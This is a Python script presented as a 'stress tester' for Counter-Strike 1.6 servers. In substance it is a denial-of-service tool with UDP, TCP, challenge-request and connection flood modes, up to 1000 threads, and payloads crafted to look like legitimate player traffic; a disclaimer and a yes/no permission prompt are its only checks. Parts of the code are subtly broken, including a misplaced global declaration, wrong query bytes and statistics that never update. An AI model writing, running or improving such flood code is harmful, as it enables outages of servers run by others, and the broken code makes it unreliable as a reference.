#!/usr/bin/env python3
"""
CS 1.6 ULTIMATE SERVER STRESS TESTER
Author: Anonymous
Description: Advanced stress testing tool for Counter-Strike 1.6 servers
"""

import sys
import os
import time
import random
import socket
import threading
import argparse
import select
import struct
import zlib
import hashlib
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import cpu_count
from datetime import datetime

# ========================
# GLOBAL CONFIGURATION
# ========================
VERSION = "1.6-ULTIMATE"
MAX_THREADS = 1000  # Maximum worker threads
CONNECTION_TIMEOUT = 10  # Seconds
DEFAULT_PORT = 27015  # Default CS 1.6 server port
DEBUG_MODE = False  # Debug output
RUNNING = True  # Global running flag

# ========================
# CS 1.6 PROTOCOL CONSTANTS
# ========================
PROTOCOL_VERSION = 47
CHALLENGE_RESPONSE = -1
A2S_INFO = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00"
A2S_PLAYER = b"\xFF\xFF\xFF\xFFT\x11"
A2S_RULES = b"\xFF\xFF\xFF\xFFT\x12"
A2S_SERVERQUERY_GETCHALLENGE = b"\xFF\xFF\xFF\xFFT\x57"

# ========================
# PAYLOAD GENERATOR
# ========================
class PayloadGenerator:
    """
    Generate CS 1.6 protocol payloads
    """
    
    @staticmethod
    def generate_info_request():
        """Generate A2S_INFO request"""
        return A2S_INFO
    
    @staticmethod
    def generate_player_request(challenge):
        """Generate A2S_PLAYER request with challenge"""
        return A2S_PLAYER + struct.pack("<i", challenge)
    
    @staticmethod
    def generate_rules_request(challenge):
        """Generate A2S_RULES request with challenge"""
        return A2S_RULES + struct.pack("<i", challenge)
    
    @staticmethod
    def generate_challenge_request():
        """Generate challenge request"""
        return A2S_SERVERQUERY_GETCHALLENGE
    
    @staticmethod
    def generate_connection_flood():
        """Generate connection flood payload"""
        return b"\xFF\xFF\xFF\xFF\x55" + os.urandom(512)
    
    @staticmethod
    def generate_legit_looking_payload():
        """Generate payload that looks like legit player traffic"""
        payloads = [
            b"\xFF\xFF\xFF\xFF\x55" + os.urandom(128),  # Connection attempt
            b"\xFF\xFF\xFF\xFF\x42" + os.urandom(256),  # Game event
            b"\xFF\xFF\xFF\xFF\x43" + os.urandom(192),  # Player update
            b"\xFF\xFF\xFF\xFF\x44" + os.urandom(320),  # Map data
        ]
        return random.choice(payloads)

# ========================
# ATTACK METHODS
# ========================
class AttackMethods:
    """
    Different attack methods for CS 1.6 servers
    """
    
    @staticmethod
    def udp_flood(target_ip, target_port, payload):
        """UDP flood attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(CONNECTION_TIMEOUT)
            
            while RUNNING:
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    if DEBUG_MODE:
                        print(f"[UDP] Sent {len(payload)} bytes to {target_ip}:{target_port}")
                except Exception as e:
                    if DEBUG_MODE:
                        print(f"[UDP Error] {e}")
                    break
        finally:
            sock.close()
    
    @staticmethod
    def tcp_flood(target_ip, target_port, payload):
        """TCP flood attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(CONNECTION_TIMEOUT)
            sock.connect((target_ip, target_port))
            
            while RUNNING:
                try:
                    sock.send(payload)
                    if DEBUG_MODE:
                        print(f"[TCP] Sent {len(payload)} bytes to {target_ip}:{target_port}")
                except Exception as e:
                    if DEBUG_MODE:
                        print(f"[TCP Error] {e}")
                    break
        finally:
            sock.close()
    
    @staticmethod
    def challenge_flood(target_ip, target_port):
        """Challenge request flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(CONNECTION_TIMEOUT)
            
            while RUNNING:
                try:
                    # Send challenge request
                    sock.sendto(PayloadGenerator.generate_challenge_request(), (target_ip, target_port))
                    
                    # Wait for response
                    ready = select.select([sock], [], [], 0.5)
                    if ready[0]:
                        data, addr = sock.recvfrom(4096)
                        if len(data) > 4 and data[4] == 0x41:  # Challenge response
                            challenge = struct.unpack("<i", data[5:9])[0]
                            
                            # Follow up with player/rules requests
                            sock.sendto(PayloadGenerator.generate_player_request(challenge), (target_ip, target_port))
                            sock.sendto(PayloadGenerator.generate_rules_request(challenge), (target_ip, target_port))
                    
                    if DEBUG_MODE:
                        print(f"[Challenge] Sent requests to {target_ip}:{target_port}")
                except Exception as e:
                    if DEBUG_MODE:
                        print(f"[Challenge Error] {e}")
                    break
        finally:
            sock.close()
    
    @staticmethod
    def connection_flood(target_ip, target_port):
        """TCP connection flood"""
        while RUNNING:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target_ip, target_port))
                
                # Send multiple payloads before closing
                for _ in range(random.randint(3, 10)):
                    try:
                        sock.send(PayloadGenerator.generate_legit_looking_payload())
                        time.sleep(0.1)
                    except:
                        break
                
                if DEBUG_MODE:
                    print(f"[Connection] Established and sent data to {target_ip}:{target_port}")
            except Exception as e:
                if DEBUG_MODE:
                    print(f"[Connection Error] {e}")
            finally:
                try:
                    sock.close()
                except:
                    pass

# ========================
# ATTACK CONTROLLER
# ========================
class CS16StressTester:
    """
    Main controller for CS 1.6 server stress testing
    """
    
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = []
        self.stats = {
            'start_time': time.time(),
            'total_requests': 0,
            'successful': 0,
            'errors': 0,
            'methods': {
                'udp': 0,
                'tcp': 0,
                'challenge': 0,
                'connection': 0
            }
        }
    
    def start_attack(self, method='udp', threads=MAX_THREADS):
        """Start the selected attack method"""
        print(f"\n[!] Starting {method.upper()} attack on {self.target_ip}:{self.target_port}")
        print(f"[!] Threads: {threads}")
        print("[!] Press CTRL+C to stop the attack\n")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            try:
                # Start attack threads
                for i in range(threads):
                    if method == 'udp':
                        payload = PayloadGenerator.generate_legit_looking_payload()
                        futures.append(executor.submit(
                            AttackMethods.udp_flood, 
                            self.target_ip, 
                            self.target_port, 
                            payload
                        ))
                    elif method == 'tcp':
                        payload = PayloadGenerator.generate_legit_looking_payload()
                        futures.append(executor.submit(
                            AttackMethods.tcp_flood, 
                            self.target_ip, 
                            self.target_port, 
                            payload
                        ))
                    elif method == 'challenge':
                        futures.append(executor.submit(
                            AttackMethods.challenge_flood, 
                            self.target_ip, 
                            self.target_port
                        ))
                    elif method == 'connection':
                        futures.append(executor.submit(
                            AttackMethods.connection_flood, 
                            self.target_ip, 
                            self.target_port
                        ))
                
                # Monitor threads
                while RUNNING:
                    time.sleep(1)
                    self.print_stats()
                    
            except KeyboardInterrupt:
                print("\n[!] Stopping attack...")
                global RUNNING
                RUNNING = False
                
                # Wait for threads to finish
                for future in futures:
                    future.cancel()
    
    def print_stats(self):
        """Print current attack statistics"""
        elapsed = time.time() - self.stats['start_time']
        print("\n" + "="*80)
        print(f"CS 1.6 STRESS TEST STATS - {datetime.now().strftime('%H:%M:%S')}")
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Elapsed: {elapsed:.1f}s")
        print("-"*80)
        print(f"Total Requests: {self.stats['total_requests']}")
        print(f"Successful: {self.stats['successful']} | Errors: {self.stats['errors']}")
        print("-"*80)
        print("Method Distribution:")
        for method, count in self.stats['methods'].items():
            print(f"  {method.upper()}: {count}")
        print("="*80)

# ========================
# COMMAND LINE INTERFACE
# ========================
def get_user_input():
    """Get target IP and port from user"""
    parser = argparse.ArgumentParser(description=f"CS 1.6 Ultimate Stress Tester v{VERSION}")
    parser.add_argument('ip', help="Target server IP address")
    parser.add_argument('-p', '--port', type=int, default=DEFAULT_PORT,
                       help="Target server port")
    parser.add_argument('-m', '--method', default='udp',
                       choices=['udp', 'tcp', 'challenge', 'connection'],
                       help="Attack method to use")
    parser.add_argument('-t', '--threads', type=int, default=MAX_THREADS,
                       help="Number of threads to use")
    parser.add_argument('--debug', action='store_true',
                       help="Enable debug output")
    
    return parser.parse_args()

def validate_ip(ip):
    """Validate IP address"""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def main():
    """Main entry point"""
    args = get_user_input()
    
    if not validate_ip(args.ip):
        print("Error: Invalid IP address format")
        return
    
    global DEBUG_MODE
    DEBUG_MODE = args.debug
    
    print("\n" + "="*80)
    print(f"CS 1.6 ULTIMATE STRESS TESTER v{VERSION}")
    print("="*80)
    print("WARNING: THIS IS A POWERFUL STRESS TESTING TOOL")
    print("ONLY USE ON SERVERS YOU OWN WITH EXPLICIT PERMISSION")
    print("MISUSE MAY VIOLATE LAWS AND TERMS OF SERVICE")
    print("="*80 + "\n")
    
    confirm = input("Do you have legal permission to test this server? (yes/no): ").lower()
    if confirm != 'yes':
        print("Test cancelled.")
        return
    
    # Start attack
    tester = CS16StressTester(args.ip, args.port)
    
    try:
        tester.start_attack(method=args.method, threads=args.threads)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        global RUNNING
        RUNNING = False
        tester.print_stats()

if __name__ == "__main__":
    main()
